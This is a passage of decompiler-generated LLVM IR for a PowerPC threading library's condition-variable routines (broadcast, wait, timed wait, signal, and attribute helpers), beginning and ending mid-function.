  store i32 %v0_10014f90, i32* %arg1, align 4
  %v2_10014f94 = add i32 %tmp, 4
  %v3_10014f94 = inttoptr i32 %v2_10014f94 to i32*
  store i32 %v0_10014f90, i32* %v3_10014f94, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014fa0 = add i32 %arg1, 8
  %v2_10014fa0 = inttoptr i32 %v1_10014fa0 to i32*
  %v3_10014fa0 = load i32, i32* %v2_10014fa0, align 4
  %v2_10014fa4 = icmp ne i32 %v3_10014fa0, 0
  %v1_10014fac = select i1 %v2_10014fa4, i32 16, i32 0
  ret i32 %v1_10014fac
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014fd4 = icmp eq i32 %arg1, 0
  %v2_10014fd4 = icmp ugt i32 %arg1, 1
  %v0_10014fe4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10014fd4, i32 %v0_10014fe4)
  %v1_10014fec = select i1 %v1_10014fd4, i32 0, i32 38
  ret i32 %v1_10014fec
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10014ff8 = call i32 @__asm_mfcr()
  store i32 %v0_10014ff8, i32* %r3.global-to-local, align 4
  %v3_10015000 = icmp eq i32 %arg2, 0
  store i1 %v3_10015000, i1* @cr4_eq, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10014ff8, i32* @r31, align 4
  store i32 %v0_10014ff8, i32* @r4, align 4
  br i1 %v3_10015000, label %dec_label_pc_10015038, label %dec_label_pc_10015020

dec_label_pc_10015020:                            ; preds = %entry
  %v1_10015020 = add i32 %v0_10014ff8, 64
  %v2_10015020 = inttoptr i32 %v1_10015020 to i8*
  %v3_10015020 = load i8, i8* %v2_10015020, align 1
  %v3_10015024 = icmp eq i8 %v3_10015020, 0
  br i1 %v3_10015024, label %dec_label_pc_10015038.thread, label %dec_label_pc_10015048

dec_label_pc_10015038.thread:                     ; preds = %dec_label_pc_10015020
  %v2_100150384 = add i32 %v0_10014ff8, 444
  %v3_100150385 = inttoptr i32 %v2_100150384 to i32*
  store i32 %arg2, i32* %v3_100150385, align 4
  br label %dec_label_pc_10015048

dec_label_pc_10015038:                            ; preds = %entry
  %v1_10015030 = add i32 %v0_10014ff8, 28
  %v2_10015030 = inttoptr i32 %v1_10015030 to i32*
  %v3_10015030 = load i32, i32* %v2_10015030, align 4
  store i32 %v3_10015030, i32* @r3, align 4
  store i32 268521528, i32* @lr, align 4
  %v0_10015034 = call i32 @__pthread_lock()
  store i32 %v0_10015034, i32* %r3.global-to-local, align 4
  %v0_10015038.pre = load i32, i32* @r30, align 4
  %v1_10015038.pre = load i32, i32* @r31, align 4
  %v0_1001503c.pre = load i1, i1* @cr4_eq, align 1
  %v2_10015038 = add i32 %v1_10015038.pre, 444
  %v3_10015038 = inttoptr i32 %v2_10015038 to i32*
  store i32 %v0_10015038.pre, i32* %v3_10015038, align 4
  br i1 %v0_1001503c.pre, label %dec_label_pc_10015040, label %dec_label_pc_10015048

dec_label_pc_10015040:                            ; preds = %dec_label_pc_10015038
  %v0_10015040 = load i32, i32* @r31, align 4
  %v1_10015040 = add i32 %v0_10015040, 28
  %v2_10015040 = inttoptr i32 %v1_10015040 to i32*
  %v3_10015040 = load i32, i32* %v2_10015040, align 4
  store i32 %v3_10015040, i32* @r3, align 4
  store i32 268521544, i32* @lr, align 4
  %v0_10015044 = call i32 @__pthread_unlock()
  store i32 %v0_10015044, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015048

dec_label_pc_10015048:                            ; preds = %dec_label_pc_10015038.thread, %dec_label_pc_10015038, %dec_label_pc_10015020, %dec_label_pc_10015040
  %v1_1001505c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10014ff8)
  %v0_10015060 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10015060

; uselistorder directives
  uselistorder i32 %v0_10014ff8, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_10015048, { 3, 1, 0, 2 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268521588, i32* @lr, align 4
  %v0_10015070 = call i32 @__pthread_restart_new()
  ret i32 %v0_10015070
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100150a0.1037 to i32), i32* @lr, align 4
  %v0_1001509c = call i32 @__pthread_lock()
  %v0_100150a4 = load i32, i32* @r29, align 4
  %v1_100150a4 = add i32 %v0_100150a4, 8
  %v2_100150a4 = inttoptr i32 %v1_100150a4 to i32*
  %v3_100150a4 = load i32, i32* %v2_100150a4, align 4
  store i32 %v3_100150a4, i32* @r31, align 4
  store i32 0, i32* %v2_100150a4, align 4
  %v0_100150ac = load i32, i32* @r29, align 4
  store i32 %v0_100150ac, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100150b4.1038 to i32), i32* @lr, align 4
  %v0_100150b0 = call i32 @__pthread_unlock()
  %v0_100150dc1 = load i32, i32* @r31, align 4
  %v3_100150dc4 = icmp eq i32 %v0_100150dc1, 0
  br i1 %v3_100150dc4, label %dec_label_pc_100150e4, label %dec_label_pc_100150b8

dec_label_pc_100150b8:                            ; preds = %entry, %dec_label_pc_100150b8
  %v0_100150bc = phi i32 [ %v0_100150dc, %dec_label_pc_100150b8 ], [ %v0_100150dc1, %entry ]
  %v1_100150bc = add i32 %v0_100150bc, 8
  %v2_100150bc = inttoptr i32 %v1_100150bc to i32*
  %v3_100150bc = load i32, i32* %v2_100150bc, align 4
  store i32 %v3_100150bc, i32* @r29, align 4
  %v3_100150c0 = add i32 %v0_100150bc, 441
  %v4_100150c0 = inttoptr i32 %v3_100150c0 to i8*
  store i8 1, i8* %v4_100150c0, align 1
  %v1_100150c8 = load i32, i32* @r31, align 4
  %v2_100150c8 = add i32 %v1_100150c8, 8
  %v3_100150c8 = inttoptr i32 %v2_100150c8 to i32*
  store i32 0, i32* %v3_100150c8, align 4
  %v0_100150d0 = load i32, i32* @r31, align 4
  store i32 %v0_100150d0, i32* @r3, align 4
  %v0_100150d4 = load i32, i32* @r29, align 4
  store i32 %v0_100150d4, i32* @r31, align 4
  store i32 268521692, i32* @lr, align 4
  %v1_100150d8 = call i32 @restart(i32 %v0_100150d0)
  %v0_100150dc = load i32, i32* @r31, align 4
  %v3_100150dc = icmp eq i32 %v0_100150dc, 0
  br i1 %v3_100150dc, label %dec_label_pc_100150e4, label %dec_label_pc_100150b8

dec_label_pc_100150e4:                            ; preds = %dec_label_pc_100150b8, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_100150dc, { 1, 0 }
  uselistorder i32 %v0_100150bc, { 1, 0 }
  uselistorder label %dec_label_pc_100150b8, { 1, 0 }
}

define i32 @suspend.1(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268521740, i32* @lr, align 4
  %v0_10015108 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10015108
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg3, i32* @r27, align 4
  %v1_10015138 = add i32 %arg2, 12
  %v2_10015138 = inttoptr i32 %v1_10015138 to i32*
  %v3_10015138 = load i32, i32* %v2_10015138, align 4
  %v0_1001513c = load i32, i32* @r2, align 4
  %v3_10015140 = icmp eq i32 %v3_10015138, 3
  br i1 %v3_10015140, label %dec_label_pc_10015164, label %dec_label_pc_10015148

dec_label_pc_10015148:                            ; preds = %entry
  %v3_10015148 = icmp eq i32 %v3_10015138, 0
  br i1 %v3_10015148, label %dec_label_pc_10015164, label %dec_label_pc_10015150

dec_label_pc_10015150:                            ; preds = %dec_label_pc_10015148
  %v1_10015158 = add i32 %arg2, 8
  %v2_10015158 = inttoptr i32 %v1_10015158 to i32*
  %v3_10015158 = load i32, i32* %v2_10015158, align 4
  %v4_1001515c = icmp eq i32 %v3_10015158, %v0_1001513c
  br i1 %v4_1001515c, label %dec_label_pc_10015164, label %dec_label_pc_100152fc

dec_label_pc_10015164:                            ; preds = %dec_label_pc_10015150, %dec_label_pc_10015148, %entry
  store i32 %v0_1001513c, i32* @r11, align 4
  %v2_10015178 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10015180 = add i32 %v0_1001513c, 441
  %v4_10015180 = inttoptr i32 %v3_10015180 to i8*
  store i8 0, i8* %v4_10015180, align 1
  store i32 268521868, i32* @lr, align 4
  %v2_10015188 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001513c, i32 %v2_10015178)
  %v0_1001518c = load i32, i32* @r31, align 4
  store i32 %v0_1001518c, i32* @r3, align 4
  store i32 %v0_1001513c, i32* @r4, align 4
  store i32 268521880, i32* @lr, align 4
  %v0_10015194 = call i32 @__pthread_lock()
  store i32 %v0_1001513c, i32* @r9, align 4
  %v1_1001519c = add i32 %v0_1001513c, 66
  %v2_1001519c = inttoptr i32 %v1_1001519c to i8*
  %v3_1001519c = load i8, i8* %v2_1001519c, align 1
  %v3_100151a0 = icmp eq i8 %v3_1001519c, 0
  br i1 %v3_100151a0, label %dec_label_pc_100151bc, label %dec_label_pc_100151a8

dec_label_pc_100151a8:                            ; preds = %dec_label_pc_10015164
  store i32 %v0_1001513c, i32* @r9, align 4
  store i32 1, i32* @r29, align 4
  %v1_100151b0 = add i32 %v0_1001513c, 64
  %v2_100151b0 = inttoptr i32 %v1_100151b0 to i8*
  %v3_100151b0 = load i8, i8* %v2_100151b0, align 1
  %v3_100151b4 = icmp eq i8 %v3_100151b0, 0
  br i1 %v3_100151b4, label %dec_label_pc_100151cc, label %dec_label_pc_100151bc

dec_label_pc_100151bc:                            ; preds = %dec_label_pc_100151a8, %dec_label_pc_10015164
  %v0_100151c0 = load i32, i32* @r31, align 4
  %v1_100151c0 = add i32 %v0_100151c0, 8
  store i32 0, i32* @r29, align 4
  %v2_100151c8 = call i32 @enqueue(i32 %v1_100151c0, i32 %v0_1001513c)
  br label %dec_label_pc_100151cc

dec_label_pc_100151cc:                            ; preds = %dec_label_pc_100151a8, %dec_label_pc_100151bc
  %v0_100151cc = load i32, i32* @r31, align 4
  store i32 %v0_100151cc, i32* @r3, align 4
  store i32 268521940, i32* @lr, align 4
  %v0_100151d0 = call i32 @__pthread_unlock()
  %v0_100151d4 = load i32, i32* @r29, align 4
  %v3_100151d4 = icmp eq i32 %v0_100151d4, 0
  br i1 %v3_100151d4, label %dec_label_pc_100151ec, label %dec_label_pc_100151dc

dec_label_pc_100151dc:                            ; preds = %dec_label_pc_100151cc
  store i32 ptrtoint (i32* @global_var_100151e8.1039 to i32), i32* @lr, align 4
  %v2_100151e4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001513c, i32 0)
  br label %dec_label_pc_100152b4

dec_label_pc_100151ec:                            ; preds = %dec_label_pc_100151cc
  %v0_100151ec = load i32, i32* @r30, align 4
  store i32 %v0_100151ec, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  store i32 268521976, i32* @lr, align 4
  %v0_100151f4 = call i32 @pthread_mutex_unlock()
  %v1_10015254 = add i32 %v0_1001513c, 440
  %v2_10015254 = inttoptr i32 %v1_10015254 to i8*
  %v1_10015264 = add i32 %v0_1001513c, 64
  %v2_10015264 = inttoptr i32 %v1_10015264 to i8*
  br label %dec_label_pc_100151f8

dec_label_pc_100151f8:                            ; preds = %dec_label_pc_10015270, %dec_label_pc_100151ec
  %v0_100151fc = load i32, i32* @r27, align 4
  store i32 268521988, i32* @lr, align 4
  %v2_10015200 = inttoptr i32 %v0_100151fc to i32*
  %v3_10015200 = call i32 @__pthread_timedsuspend_new(i32 %v0_1001513c, i32* %v2_10015200)
  %v3_10015204 = icmp eq i32 %v3_10015200, 0
  br i1 %v3_10015204, label %dec_label_pc_1001520c, label %dec_label_pc_10015240

dec_label_pc_1001520c:                            ; preds = %dec_label_pc_100151f8
  store i32 %v0_1001513c, i32* @r4, align 4
  %v0_10015210 = load i32, i32* @r31, align 4
  store i32 %v0_10015210, i32* @r3, align 4
  store i32 268522008, i32* @lr, align 4
  %v0_10015214 = call i32 @__pthread_lock()
  %v0_10015218 = load i32, i32* @r31, align 4
  %v1_10015218 = add i32 %v0_10015218, 8
  store i32 %v1_10015218, i32* @r3, align 4
  %v2_10015220 = call i32 @remove_from_queue(i32 %v1_10015218, i32 %v0_1001513c)
  %v0_10015228 = load i32, i32* @r31, align 4
  store i32 %v0_10015228, i32* @r3, align 4
  store i32 268522032, i32* @lr, align 4
  %v0_1001522c = call i32 @__pthread_unlock()
  %v3_10015230 = icmp eq i32 %v2_10015220, 0
  br i1 %v3_10015230, label %dec_label_pc_10015238, label %dec_label_pc_100152c0

dec_label_pc_10015238:                            ; preds = %dec_label_pc_1001520c
  store i32 %v0_1001513c, i32* @r3, align 4
  store i32 268522048, i32* @lr, align 4
  %v1_1001523c = call i32 @suspend.1(i32 %v0_1001513c)
  br label %dec_label_pc_10015240

dec_label_pc_10015240:                            ; preds = %dec_label_pc_100151f8, %dec_label_pc_10015238
  %v3_10015244 = load i8, i8* %v4_10015180, align 1
  %v3_10015248 = icmp eq i8 %v3_10015244, 0
  br i1 %v3_10015248, label %dec_label_pc_10015250, label %dec_label_pc_10015278

dec_label_pc_10015250:                            ; preds = %dec_label_pc_10015240
  %v3_10015254 = load i8, i8* %v2_10015254, align 1
  %v3_10015258 = icmp eq i8 %v3_10015254, 0
  br i1 %v3_10015258, label %dec_label_pc_10015270, label %dec_label_pc_10015260

dec_label_pc_10015260:                            ; preds = %dec_label_pc_10015250
  %v3_10015264 = load i8, i8* %v2_10015264, align 1
  %v3_10015268 = icmp eq i8 %v3_10015264, 0
  br i1 %v3_10015268, label %dec_label_pc_10015278, label %dec_label_pc_10015270

dec_label_pc_10015270:                            ; preds = %dec_label_pc_10015260, %dec_label_pc_10015250
  %v0_10015270 = load i32, i32* @r28, align 4
  %v1_10015270 = add i32 %v0_10015270, 1
  store i32 %v1_10015270, i32* @r28, align 4
  br label %dec_label_pc_100151f8

dec_label_pc_10015278:                            ; preds = %dec_label_pc_10015240, %dec_label_pc_10015260
  store i32 268522116, i32* @lr, align 4
  %v2_10015280 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001513c, i32 0)
  %v3_10015288 = load i8, i8* %v2_10015254, align 1
  %v3_1001528c = icmp eq i8 %v3_10015288, 0
  br i1 %v3_1001528c, label %dec_label_pc_100152e4.preheader, label %dec_label_pc_10015294

dec_label_pc_10015294:                            ; preds = %dec_label_pc_10015278
  %v3_10015298 = load i8, i8* %v2_10015264, align 1
  %v3_1001529c = icmp eq i8 %v3_10015298, 0
  br i1 %v3_1001529c, label %dec_label_pc_100152a4, label %dec_label_pc_100152e4.preheader

dec_label_pc_100152e4.preheader:                  ; preds = %dec_label_pc_10015278, %dec_label_pc_10015294
  %v0_100152e41 = load i32, i32* @r28, align 4
  %v3_100152e44 = icmp eq i32 %v0_100152e41, 0
  %v1_100152e86 = add i32 %v0_100152e41, -1
  store i32 %v1_100152e86, i32* %r28.global-to-local, align 4
  br i1 %v3_100152e44, label %dec_label_pc_100152f0, label %dec_label_pc_100152dc

dec_label_pc_100152a4:                            ; preds = %dec_label_pc_10015294
  %v0_100152a8 = load i32, i32* @r30, align 4
  store i8 0, i8* %v2_10015254, align 1
  store i32 268522164, i32* @lr, align 4
  %v1_100152b0 = call i32 @pthread_mutex_lock(i32 %v0_100152a8)
  br label %dec_label_pc_100152b4

dec_label_pc_100152b4:                            ; preds = %dec_label_pc_100151dc, %dec_label_pc_100152a4
  %v0_100152bc = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100152c0

dec_label_pc_100152c0:                            ; preds = %dec_label_pc_1001520c, %dec_label_pc_100152b4
  store i32 268522188, i32* @lr, align 4
  %v2_100152c8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001513c, i32 0)
  %v0_100152cc = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100152d4.1040 to i32), i32* @lr, align 4
  %v1_100152d0 = call i32 @pthread_mutex_lock(i32 %v0_100152cc)
  br label %dec_label_pc_100152fc

dec_label_pc_100152dc:                            ; preds = %dec_label_pc_100152e4.preheader, %dec_label_pc_100152dc
  store i32 %v0_1001513c, i32* @r3, align 4
  store i32 268522212, i32* @lr, align 4
  %v1_100152e0 = call i32 @restart(i32 %v0_1001513c)
  %v0_100152e4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100152e4 = icmp eq i32 %v0_100152e4, 0
  %v1_100152e8 = add i32 %v0_100152e4, -1
  store i32 %v1_100152e8, i32* %r28.global-to-local, align 4
  br i1 %v3_100152e4, label %dec_label_pc_100152f0, label %dec_label_pc_100152dc

dec_label_pc_100152f0:                            ; preds = %dec_label_pc_100152dc, %dec_label_pc_100152e4.preheader
  %v0_100152f0 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100152f8.1041 to i32), i32* @lr, align 4
  %v1_100152f4 = call i32 @pthread_mutex_lock(i32 %v0_100152f0)
  br label %dec_label_pc_100152fc

dec_label_pc_100152fc:                            ; preds = %dec_label_pc_10015150, %dec_label_pc_100152c0, %dec_label_pc_100152f0
  %v0_1001530c = phi i32 [ 22, %dec_label_pc_10015150 ], [ 110, %dec_label_pc_100152c0 ], [ 0, %dec_label_pc_100152f0 ]
  ret i32 %v0_1001530c

; uselistorder directives
  uselistorder i8* %v2_10015254, { 1, 0, 2 }
  uselistorder i32 %v0_1001513c, { 7, 6, 5, 8, 12, 11, 13, 14, 15, 9, 10, 4, 16, 3, 2, 18, 17, 19, 20, 0, 21, 1 }
  uselistorder label %dec_label_pc_100152fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100152dc, { 1, 0 }
  uselistorder label %dec_label_pc_100152c0, { 1, 0 }
  uselistorder label %dec_label_pc_100152b4, { 1, 0 }
  uselistorder label %dec_label_pc_100152e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10015278, { 1, 0 }
  uselistorder label %dec_label_pc_10015240, { 1, 0 }
  uselistorder label %dec_label_pc_100151cc, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10015328 = add i32 %arg2, 12
  %v2_10015328 = inttoptr i32 %v1_10015328 to i32*
  %v3_10015328 = load i32, i32* %v2_10015328, align 4
  %v0_1001532c = load i32, i32* @r2, align 4
  %v3_10015330 = icmp eq i32 %v3_10015328, 3
  br i1 %v3_10015330, label %dec_label_pc_10015354, label %dec_label_pc_10015338

dec_label_pc_10015338:                            ; preds = %entry
  %v3_10015338 = icmp eq i32 %v3_10015328, 0
  br i1 %v3_10015338, label %dec_label_pc_10015354, label %dec_label_pc_10015340

dec_label_pc_10015340:                            ; preds = %dec_label_pc_10015338
  %v1_10015348 = add i32 %arg2, 8
  %v2_10015348 = inttoptr i32 %v1_10015348 to i32*
  %v3_10015348 = load i32, i32* %v2_10015348, align 4
  %v4_1001534c = icmp eq i32 %v3_10015348, %v0_1001532c
  br i1 %v4_1001534c, label %dec_label_pc_10015354, label %dec_label_pc_10015490

dec_label_pc_10015354:                            ; preds = %dec_label_pc_10015340, %dec_label_pc_10015338, %entry
  store i32 %v0_1001532c, i32* @r11, align 4
  %v2_10015368 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10015370 = add i32 %v0_1001532c, 441
  %v4_10015370 = inttoptr i32 %v3_10015370 to i8*
  store i8 0, i8* %v4_10015370, align 1
  store i32 268522364, i32* @lr, align 4
  %v2_10015378 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001532c, i32 %v2_10015368)
  %v0_1001537c = load i32, i32* @r31, align 4
  store i32 %v0_1001537c, i32* @r3, align 4
  store i32 %v0_1001532c, i32* @r4, align 4
  store i32 268522376, i32* @lr, align 4
  %v0_10015384 = call i32 @__pthread_lock()
  store i32 %v0_1001532c, i32* @r9, align 4
  %v1_1001538c = add i32 %v0_1001532c, 66
  %v2_1001538c = inttoptr i32 %v1_1001538c to i8*
  %v3_1001538c = load i8, i8* %v2_1001538c, align 1
  %v3_10015390 = icmp eq i8 %v3_1001538c, 0
  br i1 %v3_10015390, label %dec_label_pc_100153ac, label %dec_label_pc_10015398

dec_label_pc_10015398:                            ; preds = %dec_label_pc_10015354
  store i32 %v0_1001532c, i32* @r9, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_100153a0 = add i32 %v0_1001532c, 64
  %v2_100153a0 = inttoptr i32 %v1_100153a0 to i8*
  %v3_100153a0 = load i8, i8* %v2_100153a0, align 1
  %v3_100153a4 = icmp eq i8 %v3_100153a0, 0
  br i1 %v3_100153a4, label %dec_label_pc_100153bc, label %dec_label_pc_100153ac

dec_label_pc_100153ac:                            ; preds = %dec_label_pc_10015398, %dec_label_pc_10015354
  %v0_100153b0 = load i32, i32* @r31, align 4
  %v1_100153b0 = add i32 %v0_100153b0, 8
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_100153b8 = call i32 @enqueue(i32 %v1_100153b0, i32 %v0_1001532c)
  br label %dec_label_pc_100153bc

dec_label_pc_100153bc:                            ; preds = %dec_label_pc_10015398, %dec_label_pc_100153ac
  %v0_100153bc = load i32, i32* @r31, align 4
  store i32 %v0_100153bc, i32* @r3, align 4
  store i32 268522436, i32* @lr, align 4
  %v0_100153c0 = call i32 @__pthread_unlock()
  %v0_100153c4 = load i32, i32* %r30.global-to-local, align 4
  %v3_100153c4 = icmp eq i32 %v0_100153c4, 0
  br i1 %v3_100153c4, label %dec_label_pc_100153dc, label %dec_label_pc_100153cc

dec_label_pc_100153cc:                            ; preds = %dec_label_pc_100153bc
  store i32 ptrtoint (i32* @global_var_100153d8.1042 to i32), i32* @lr, align 4
  %v2_100153d4 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001532c, i32 0)
  br label %dec_label_pc_10015464

dec_label_pc_100153dc:                            ; preds = %dec_label_pc_100153bc
  %v0_100153dc = load i32, i32* @r29, align 4
  store i32 %v0_100153dc, i32* @r3, align 4
  store i32 268522472, i32* @lr, align 4
  %v0_100153e4 = call i32 @pthread_mutex_unlock()
  %v1_10015404 = add i32 %v0_1001532c, 440
  %v2_10015404 = inttoptr i32 %v1_10015404 to i8*
  %v1_10015414 = add i32 %v0_1001532c, 64
  %v2_10015414 = inttoptr i32 %v1_10015414 to i8*
  store i32 %v0_1001532c, i32* @r3, align 4
  store i32 268522480, i32* @lr, align 4
  %v1_100153ec7 = call i32 @suspend.1(i32 %v0_1001532c)
  %v3_100153f48 = load i8, i8* %v4_10015370, align 1
  %v3_100153f811 = icmp eq i8 %v3_100153f48, 0
  br i1 %v3_100153f811, label %dec_label_pc_10015400, label %dec_label_pc_10015428

dec_label_pc_10015400:                            ; preds = %dec_label_pc_100153dc, %dec_label_pc_10015420
  %v3_10015404 = load i8, i8* %v2_10015404, align 1
  %v3_10015408 = icmp eq i8 %v3_10015404, 0
  br i1 %v3_10015408, label %dec_label_pc_10015420, label %dec_label_pc_10015410

dec_label_pc_10015410:                            ; preds = %dec_label_pc_10015400
  %v3_10015414 = load i8, i8* %v2_10015414, align 1
  %v3_10015418 = icmp eq i8 %v3_10015414, 0
  br i1 %v3_10015418, label %dec_label_pc_10015428, label %dec_label_pc_10015420

dec_label_pc_10015420:                            ; preds = %dec_label_pc_10015410, %dec_label_pc_10015400
  store i32 %v0_1001532c, i32* @r3, align 4
  store i32 268522480, i32* @lr, align 4
  %v1_100153ec = call i32 @suspend.1(i32 %v0_1001532c)
  %v3_100153f4 = load i8, i8* %v4_10015370, align 1
  %v3_100153f8 = icmp eq i8 %v3_100153f4, 0
  br i1 %v3_100153f8, label %dec_label_pc_10015400, label %dec_label_pc_10015428

dec_label_pc_10015428:                            ; preds = %dec_label_pc_10015410, %dec_label_pc_10015420, %dec_label_pc_100153dc
  store i32 268522548, i32* @lr, align 4
  %v2_10015430 = call i32 @__pthread_set_own_extricate_if(i32 %v0_1001532c, i32 0)
  %v3_10015438 = load i8, i8* %v2_10015404, align 1
  %v3_1001543c = icmp eq i8 %v3_10015438, 0
  br i1 %v3_1001543c, label %dec_label_pc_10015478, label %dec_label_pc_10015444

dec_label_pc_10015444:                            ; preds = %dec_label_pc_10015428
  %v3_10015448 = load i8, i8* %v2_10015414, align 1
  %v3_1001544c = icmp eq i8 %v3_10015448, 0
  br i1 %v3_1001544c, label %dec_label_pc_10015454, label %dec_label_pc_10015478

dec_label_pc_10015454:                            ; preds = %dec_label_pc_10015444
  %v0_10015458 = load i32, i32* @r29, align 4
  store i8 0, i8* %v2_10015404, align 1
  store i32 268522596, i32* @lr, align 4
  %v1_10015460 = call i32 @pthread_mutex_lock(i32 %v0_10015458)
  br label %dec_label_pc_10015464

dec_label_pc_10015464:                            ; preds = %dec_label_pc_100153cc, %dec_label_pc_10015454
  %v0_1001546c = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10015470

dec_label_pc_10015470:                            ; preds = %dec_label_pc_10015478, %dec_label_pc_10015464
  store i32 %v0_1001532c, i32* @r3, align 4
  store i32 268522616, i32* @lr, align 4
  %v1_10015474 = call i32 @restart(i32 %v0_1001532c)
  br label %dec_label_pc_10015478

dec_label_pc_10015478:                            ; preds = %dec_label_pc_10015444, %dec_label_pc_10015428, %dec_label_pc_10015470
  %v0_10015478 = load i32, i32* @r31, align 4
  %v3_10015478 = icmp eq i32 %v0_10015478, 0
  %v1_1001547c = add i32 %v0_10015478, -1
  store i32 %v1_1001547c, i32* @r31, align 4
  br i1 %v3_10015478, label %dec_label_pc_10015484, label %dec_label_pc_10015470

dec_label_pc_10015484:                            ; preds = %dec_label_pc_10015478
  %v0_10015484 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001548c.1043 to i32), i32* @lr, align 4
  %v1_10015488 = call i32 @pthread_mutex_lock(i32 %v0_10015484)
  br label %dec_label_pc_10015490

dec_label_pc_10015490:                            ; preds = %dec_label_pc_10015340, %dec_label_pc_10015484
  %v0_100154a0 = phi i32 [ 22, %dec_label_pc_10015340 ], [ 0, %dec_label_pc_10015484 ]
  ret i32 %v0_100154a0

; uselistorder directives
  uselistorder i8* %v2_10015404, { 1, 0, 2 }
  uselistorder i8* %v4_10015370, { 1, 0, 2 }
  uselistorder i32 %v0_1001532c, { 8, 7, 9, 13, 12, 0, 1, 10, 11, 6, 14, 5, 4, 17, 16, 15, 18, 2, 19, 3 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @suspend.1, { 1, 0, 2 }
  uselistorder i32 268522480, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10015490, { 1, 0 }
  uselistorder label %dec_label_pc_10015478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015464, { 1, 0 }
  uselistorder label %dec_label_pc_10015428, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015400, { 1, 0 }
  uselistorder label %dec_label_pc_100153bc, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100154ac = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 %v0_100154ac, i32* @r4, align 4
  store i32 268522696, i32* @lr, align 4
  %v0_100154c4 = call i32 @__pthread_lock()
  %v0_100154c8 = load i32, i32* @r29, align 4
  %v1_100154cc = add i32 %arg1, 8
  store i32 %v1_100154cc, i32* @r3, align 4
  %v2_100154d0 = call i32 @remove_from_queue(i32 %v1_100154cc, i32 %v0_100154c8)
  %v0_100154d8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100154d8, i32* @r3, align 4
  store i32 268522720, i32* @lr, align 4
  %v0_100154dc = call i32 @__pthread_unlock()
  ret i32 %v2_100154d0

; uselistorder directives
  uselistorder i32 (i32, i32)* @remove_from_queue, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %v0_100154fc = call i32 @__asm_mfcr()
  store i32 %v0_100154fc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268522780, i32* @lr, align 4
  %v0_10015518 = call i32 @__pthread_lock()
  %v0_1001551c = load i32, i32* @r30, align 4
  %v1_1001551c = add i32 %v0_1001551c, 8
